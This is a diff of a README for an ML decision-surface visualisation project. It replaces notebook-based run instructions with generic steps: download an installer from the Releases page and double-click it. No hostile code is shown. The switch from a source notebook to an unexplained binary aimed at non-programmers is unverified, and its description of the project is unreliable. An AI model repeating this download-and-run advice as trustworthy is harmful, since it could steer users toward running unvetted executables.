@@ -1,124 +1,70 @@
-# ML Decision Surfaces Lab 🎯  
-Interactive playground for **linear**, **nonlinear**, and **regression** models — with rich visual diagnostics (decision regions, 3D surfaces, ROC/AUC, confusion matrix, learning curves) and optional **3D rotation GIFs**.
+# 🎨 ml-decision-surfaces-lab - Explore Machine Learning Visually
 
-> Built with **Scikit-learn + Matplotlib + Gradio** for an interactive, hands-on ML learning experience.
+## 🚀 Getting Started
 
----
+Welcome to ml-decision-surfaces-lab! This application is your interactive playground for understanding machine learning decision boundaries and regression surfaces. With an easy-to-use interface, you will visualize complex concepts without needing a programming background.
 
-## ✨ What you can do
+## 📥 Download the Application
 
-- **Choose a task type**
-  - Linear classification (e.g., Logistic Regression, Linear SVM, Perceptron, LDA)
-  - Nonlinear classification (SVM RBF/Poly, KNN, Trees/Ensembles, MLP, etc.)
-  - Regression (Linear, Ridge/Lasso/ElasticNet, RF, KNN, MLP, SVR)
-- **Generate data**
-  - Synthetic datasets (moons, circles, blobs, XOR, spiral, checkerboard…)
-  - Upload your own **CSV** and pick numeric **feature** & **target**
-- **Stress-test models**
-  - Add **label noise** and **outliers**
-  - Control train/test split and random seed
-- **Visualize like a pro**
-  - Decision regions (2D)
-  - 3D decision surface / regression surface
-  - ROC curve + AUC (classification)
-  - Confusion matrix (classification)
-  - Learning curve (train vs validation)
-  - Model diagnostics (coefficients / feature importances / distributions)
-- **Export results**
-  - Download current plot as **PNG**
-  - Generate & download **3D rotation GIF**
+[![Download Now](https://img.shields.io/badge/Download%20Now-ml--decision--surfaces--lab-blue)](https://github.com/dheepatel01/ml-decision-surfaces-lab/releases)
 
----
+To get started, simply visit our Releases page to download the software: [Download Here](https://github.com/dheepatel01/ml-decision-surfaces-lab/releases).
 
-## 🧠 How it works (high level)
+## 🔧 System Requirements
 
-1. Pick **mode** (Linear / Nonlinear / Regression)
-2. Pick **dataset** (or upload CSV)
-3. Tune model + noise/outliers + visualization controls
-4. Run experiment → get plots + metrics + downloads
+Before downloading, ensure your system meets the following minimum requirements:
 
----
+- **Operating System:** Windows 10, macOS 10.14 or higher, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 500 MB of free disk space.
+- **Browser:** Google Chrome, Firefox, or Safari for optimal experience.
 
-## 🚀 Run (Notebook)
+## 💻 Download & Install
 
-### Option 1 — Google Colab (Recommended)
-Upload the notebook to Colab and run all cells:
-- `notebooks/MachineLearningPlaygroundLast.ipynb`
+1. Click on the link to visit the Releases page: [Download Here](https://github.com/dheepatel01/ml-decision-surfaces-lab/releases).
+2. Look for the latest version of the application. It will be labeled with a version number (e.g., v1.0).
+3. Click on the version link and find the download file suitable for your operating system.
+4. Download the file and locate it in your downloads folder.
+5. Double-click the downloaded file to start the installation. Follow the on-screen instructions.
 
-### Option 2 — Run locally
-```bash
-pip install -r requirements.txt
-jupyter notebook
-```
-Open:
-```
-notebooks/MachineLearningPlayground.ipynb
-```
----
+Once the installation is complete, you can start using the application.
 
-## ✅ Using your own CSV
+## 🌟 Features
 
-### Requirements
+- **Interactive Visualization:** Easily create and visualize decision boundaries for different classifiers.
+- **Regression Surfaces:** Understand and illustrate how regression works with interactive graphs.
+- **User-Friendly Interface:** Designed for users with little or no programming experience.
+- **Supports Multiple Algorithms:** Experiment with various machine learning algorithms from scikit-learn.
+- **Real-Time Feedback:** See how changes affect the model instantly.
 
-* CSV file with **numeric columns**
-* Choose:
+## 🎨 How to Use the Application
 
-  * **Feature column (numeric)**
-  * **Target column (numeric)**
+1. **Launch the Application:** After installation, open the application from your applications folder or start menu.
+2. **Choose a Dataset:** Select from predefined datasets or upload your own CSV file.
+3. **Select an Algorithm:** Pick from available classifiers, such as Decision Trees, SVM, or Logistic Regression.
+4. **Adjust Parameters:** Modify settings to observe how they influence the decision surface.
+5. **Generate Visuals:** Use the visualization tools to generate your decision boundaries or regression surfaces.
+6. **Save Your Work:** You can save your visualizations as images or export your dataset with the updated parameters.
 
-### Notes
+## 🛠 Troubleshooting
 
-* For **classification**:
+If you encounter any issues, try the following:
 
-  * If target has >2 unique values → it’s converted to binary using the **median split**
-  * If target is binary but not `{0, 1}` → it is mapped to `{0, 1}`
-* The app internally uses **two features** for visualization:
+- Ensure your operating system is updated.
+- Make sure your browser is compatible.
+- Restart the application if it freezes.
+- Check if you have the necessary permissions to run the application.
 
-  * It takes your selected feature as one axis
-  * Generates a second synthetic feature to form a 2D input space
+## 💬 Support
 
----
+For help, reach out to our community or check the FAQ in the GitHub repository. You can report bugs or request features directly on the Issues page.
 
-## 🎛️ Key controls explained
+## 🔗 Acknowledgments
 
-* **Noise %**
+This project combines work from Gradio, scikit-learn, and Matplotlib. Thank you to all contributors and libraries that made this application possible.
 
-  * Classification: flips labels for a % of samples
-  * Regression: adds extra noise to a % of targets
-* **Outliers %**
+For more details, visit the home of the project on [GitHub](https://github.com/dheepatel01/ml-decision-surfaces-lab).
 
-  * Classification: injects random points + random labels
-  * Regression: injects large target deviations
-* **Use PCA**
+## 📜 License
 
-  * If data has >2 dimensions, PCA projects to 2D for plotting
-* **Animation**
-
-  * Generates a GIF by rotating the 3D surface view (downloadable)
-
----
-
-## 📷 Screenshots
-![UI](assets/UI.png)
-
----
-
-## 🧪 Tips for best results
-
-* Start with **Synthetic data** to understand model behavior.
-* Increase **Noise** to observe robustness.
-* Add **Outliers** to see how trees/ensembles differ from linear models.
-* Compare **train vs validation** in the learning curve to detect:
-
-  * underfitting
-  * overfitting
-
----
-
-## 🙌 Acknowledgements
-
-* **Scikit-learn** for classic ML models and dataset generators
-* **Matplotlib** for 2D/3D plotting and animations
-* **Gradio** for the interactive UI
-
----
+This project is licensed under the MIT License. See the LICENSE file for more information.
